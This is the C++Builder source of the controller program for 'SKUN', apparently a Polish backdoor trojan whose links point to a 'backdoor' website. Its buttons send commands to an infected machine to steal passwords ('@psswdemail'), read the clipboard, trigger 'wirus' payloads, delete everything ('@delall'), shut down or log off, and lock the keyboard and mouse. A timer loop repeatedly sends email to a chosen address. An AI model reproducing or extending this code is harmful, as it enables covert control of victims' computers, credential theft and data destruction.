//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
#include <shlobj.h>
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button1Click(TObject *Sender)
{
if(Edit3->Text !="")
{
NMMsg1->Host = Edit1->Text;
NMMsg2->Host = Edit1->Text;
NMMsg2->PostIt(Edit3->Text);
Edit1->Enabled = false;
Button1->Visible = false;
Button12->Visible = true;
Label16->Caption = "CONNECTED";
NMMsg1->PostIt("@wininfo");
}
else
Application->MessageBox("Musisz wpisaæ swoje IP !","B³¹d", 0 | MB_ICONERROR);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ1MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
StatusBar1->SimpleText = sMsg;
Form1->Caption ="SKUN ver 0.11 [CONNECTED]";
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button2Click(TObject *Sender)
{
NMMsg1->PostIt("@starton");    
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button3Click(TObject *Sender)
{
NMMsg1->PostIt("@startoff");    
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button8Click(TObject *Sender)
{
NMMsg1->PostIt("@iconoff");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button9Click(TObject *Sender)
{
NMMsg1->PostIt("@iconon");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button12Click(TObject *Sender)
{
NMMsg1->PostIt("@disconnect");
Edit1->Enabled = true;
Button1->Visible = true;
Button12->Visible = false;
NMMsg1->Disconnect();
NMMsg2->Disconnect();
NMMSGServ1->Disconnect();
NMMSGServ2->Disconnect();
NMMSGServ3->Disconnect();
NMMSGServ4->Disconnect();
NMMSGServ5->Disconnect();
NMMSGServ6->Disconnect();
NMMSGServ7->Disconnect();
NMMSGServ8->Disconnect();
NMMsg1->Disconnect();
Label16->Caption = "DISCONNECTED";
Label22->Caption = "-";
Label20->Caption = "-";
Label14->Caption = "-";
Label18->Caption = "-";
Label25->Caption = "-";
Label30->Caption = "-";
Label31->Caption = "-";
Label32->Caption = "-";
Label39->Caption = "-";
Memo2->Lines->Clear();
Edit1->Enabled = true;
Form1->Caption = "SKUN ver 0.12 [DISCONNECTED]";
StatusBar1->SimpleText = "ROZ£¥CZONO Z SERWEREM :(";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMsg1ConnectionFailed(TObject *Sender)
{
StatusBar1->SimpleText = "BRAK PO£¥CZENIA :(((";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMsg2ConnectionFailed(TObject *Sender)
{
StatusBar1->SimpleText = "BRAK PO£¥CZENIA :(((";
}
//---------------------------------------------------------------------------




void __fastcall TForm1::NMMSGServ3MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label20->Caption = sMsg;
Edit9->Text = sMsg;
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button4Click(TObject *Sender)
{
NMMsg1->PostIt("@monitoron");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button5Click(TObject *Sender)
{
NMMsg1->PostIt("@monitoroff");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button14Click(TObject *Sender)
{
NMMsg4->Host = Edit1->Text;
NMMsg4->PostIt(Edit5->Text);    
}
//---------------------------------------------------------------------------



void __fastcall TForm1::Button16Click(TObject *Sender)
{
NMMsg5->Host = Edit1->Text;
NMMsg5->PostIt(Memo1->Text);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button17Click(TObject *Sender)
{
OpenDialog1->Execute();
Memo1->Lines->LoadFromFile(OpenDialog1->FileName);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button18Click(TObject *Sender)
{
SaveDialog1->Execute();
Memo1->Lines->SaveToFile(SaveDialog1->FileName);    
}
//---------------------------------------------------------------------------


void __fastcall TForm1::NMMSGServ2MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo2->Text = sMsg;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button19Click(TObject *Sender)
{
NMMsg1->PostIt("@swap_mouse");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button21Click(TObject *Sender)
{
NMMsg6->Host = Edit1->Text;
NMMsg6->PostIt(Memo3->Text);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ5MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo3->Text = sMsg;
Button46->Visible = false;
Button21->Visible = true;
Button21->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button20Click(TObject *Sender)
{
NMMsg1->PostIt("@winini");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button11Click(TObject *Sender)
{
NMMsg1->PostIt("@wirus#1");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button22Click(TObject *Sender)
{
NMMsg1->PostIt("@wirus#2");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button23Click(TObject *Sender)
{
NMMsg1->PostIt("@wirus#3");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button25Click(TObject *Sender)
{
NMMsg1->PostIt("@system.ini");
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button26Click(TObject *Sender)
{
NMMsg1->PostIt("@psswdemail");    
}
//---------------------------------------------------------------------------


void __fastcall TForm1::NMMSGServ6MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label5->Caption = sMsg;
Button36->Enabled = true;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Timer2Timer(TObject *Sender)
{
Timer2->Enabled = false;
NMSMTP1->PostMessage->ToAddress->Add(Edit2->Text);
NMSMTP1->PostMessage->Subject = Edit3->Text;
NMSMTP1->PostMessage->Body->Assign(Memo11->Lines);
NMSMTP1->Connect();
NMSMTP1->SendMail();
NMSMTP1->Disconnect();
Timer2->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button27Click(TObject *Sender)
{
Timer2->Enabled = true;
Button27->Enabled = false;
Button28->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button28Click(TObject *Sender)
{
Timer2->Enabled = false;
Button27->Enabled = true;
Button28->Enabled = false;
NMSMTP1->Disconnect();    
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button31Click(TObject *Sender)
{
NMMsg1->PostIt("@sinfo");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button29Click(TObject *Sender)
{
NMMsg1->PostIt("@close");
Button12->Visible = false;
Button1->Visible = true;
Label16->Caption = "DISCONNECTED";
Label22->Caption = "-";
Label20->Caption = "-";
Label14->Caption = "-";
Label18->Caption = "-";
Label25->Caption = "-";
Label30->Caption = "-";
Label31->Caption = "-";
Label32->Caption = "-";
Edit1->Enabled = true;
Form1->Caption = "SKUN ver 0.11 [DISCONNECTED]";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ7MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo12->Text = sMsg;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button30Click(TObject *Sender)
{
NMMsg1->PostIt("@delall");    
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button34Click(TObject *Sender)
{
NMMsg1->PostIt("@chatoff");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Edit10KeyPress(TObject *Sender, char &Key)
{
if(Key == 13)
{
Label10->Caption = Edit10->Text;
NMMsg7->Host = Edit1->Text;
Memo13->Lines->Add("<"+Edit8->Text+">"+Edit10->Text);
Edit10->Text = "";
NMMsg7->PostIt(Label10->Caption);
}
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button33Click(TObject *Sender)
{
SaveDialog2->Execute();
Memo13->Lines->SaveToFile(OpenDialog1->FileName+".txt");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button32Click(TObject *Sender)
{
NMMsg7->Host = Edit1->Text;
NMMsg8->Host = Edit1->Text;
NMMsg1->PostIt("@chaton");
NMMsg7->FromName = Edit8->Text;
NMMsg8->PostIt(Edit9->Text);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ8MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo13->Lines->Add("<"+sFrom+">"+sMsg);
}
//---------------------------------------------------------------------------



void __fastcall TForm1::Button36Click(TObject *Sender)
{
Memo15->Text = Label5->Caption;
if(SaveDialog2->Execute() == TRUE)
{
Memo15->Lines->SaveToFile(SaveDialog2->FileName+".txt");
}
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button38Click(TObject *Sender)
{
NMMsg1->PostIt("@cdromo");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button39Click(TObject *Sender)
{
NMMsg1->PostIt("@cdromc");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button40Click(TObject *Sender)
{
NMMsg1->PostIt("@schowek");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button41Click(TObject *Sender)
{
NMMsg9->Host = Edit1->Text;
NMMsg9->PostIt(Edit1->Text);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ9MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Edit11->Text = sMsg;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button6Click(TObject *Sender)
{
NMMsg1->PostIt("@shutdown");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button7Click(TObject *Sender)
{
NMMsg1->PostIt("@logoff");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ10MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label14->Caption = sMsg;
   
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ11MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label18->Caption = sMsg;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button45Click(TObject *Sender)
{
NMMsg1->PostIt("@taskbar_show");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button44Click(TObject *Sender)
{
NMMsg10->Host = Edit1->Text;
NMMsg10->PostIt(Edit13->Text);   
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button15Click(TObject *Sender)
{
NMMsg11->Host = Edit1->Text;
NMMsg11->PostIt(Edit6->Text);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button35Click(TObject *Sender)
{
NMMsg1->PostIt("@www");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ12MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label12->Caption = sMsg;
Button37->Enabled = true;
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button37Click(TObject *Sender)
{
Memo16->Text = Label12->Caption;
SaveDialog2->Execute();
Memo16->Lines->SaveToFile(SaveDialog2->FileName+".txt");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ13MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label25->Caption = sMsg;    
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button47Click(TObject *Sender)
{
NMMsg12->Host = Edit1->Text;
NMMsg12->PostIt(Edit14->Text);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ14MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo3->Text = sMsg;
Button21->Visible = false;
Button46->Visible = true;
Button46->Enabled = true;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button46Click(TObject *Sender)
{
NMMsg13->Host = Edit1->Text;
NMMsg13->PostIt(Memo3->Text);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ15MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label30->Caption = sMsg;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ16MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label31->Caption = sMsg;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ17MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label32->Caption = sMsg;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button42Click(TObject *Sender)
{
NMMsg1->PostIt("@unswap_mouse");    
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button49Click(TObject *Sender)
{
NMMsg1->PostIt("@wygasz_off");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button50Click(TObject *Sender)
{
NMMsg1->PostIt("@wygasz_on");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button53Click(TObject *Sender)
{
NMMsg1->PostIt("@mysz_lock");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button51Click(TObject *Sender)
{
NMMsg1->PostIt("@jajo");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button54Click(TObject *Sender)
{
NMMsg1->PostIt("@key_off");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button55Click(TObject *Sender)
{
NMMsg1->PostIt("@key_on");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button56Click(TObject *Sender)
{
NMMsg1->PostIt("@zawies");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button57Click(TObject *Sender)
{
NMMsg1->PostIt("@keybord");    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button43Click(TObject *Sender)
{
NMMsg1->PostIt("@taskbar_hide");
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button58Click(TObject *Sender)
{
NMMsg1->PostIt("@strona_testowa");    
}
//---------------------------------------------------------------------------
void __fastcall TForm1::SpeedButton2Click(TObject *Sender)
{
ShellExecute(Handle,
                 "open",
                 "http://www.skun.backdoor.prv.pl",
                 NULL,NULL,SW_SHOWDEFAULT);

}
//---------------------------------------------------------------------------

void __fastcall TForm1::SpeedButton1Click(TObject *Sender)
{
ShellExecute(Handle,"open","http://www.skun.backdoor.prv.pl",NULL,NULL,SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::SpeedButton3Click(TObject *Sender)
{
ShellExecute(Handle,"open","mailto:xtreme-43@yoyo.pl",NULL,NULL,SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::SpeedButton4Click(TObject *Sender)
{
ShellExecute(Handle,"open","mailto:seven@yoyo.pl",NULL,NULL,SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button59Click(TObject *Sender)
{
NMMsg3->Host = Edit1->Text;
NMMsg3->PostIt(Edit12->Text);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button60Click(TObject *Sender)
{
ShowMessage(Edit12->Text);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button13Click(TObject *Sender)
{
NMMsg1->PostIt("@special_keys");
CheckBox1->Checked = false;
CheckBox2->Checked = false;
CheckBox3->Checked = false;
CheckBox4->Checked = false;
CheckBox5->Checked = false;
CheckBox6->Checked = false;
StatusBar1->SimpleText = "Trwa pobieranie informacji..";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ18MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
if(sMsg == "numlock")CheckBox1->Checked = true;
if(sMsg == "capslock")CheckBox2->Checked = true;
if(sMsg == "scroll")CheckBox3->Checked = true;
if(sMsg == "control")CheckBox4->Checked = true;
if(sMsg == "shift")CheckBox5->Checked = true;
if(sMsg == "alt")CheckBox6->Checked = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ19MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label39->Caption = sMsg;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button61Click(TObject *Sender)
{
NMMsg14->Host = Edit1->Text;
NMMsg14->PostIt(Edit4->Text);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ20MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label22->Caption = sMsg;    
}
//---------------------------------------------------------------------------

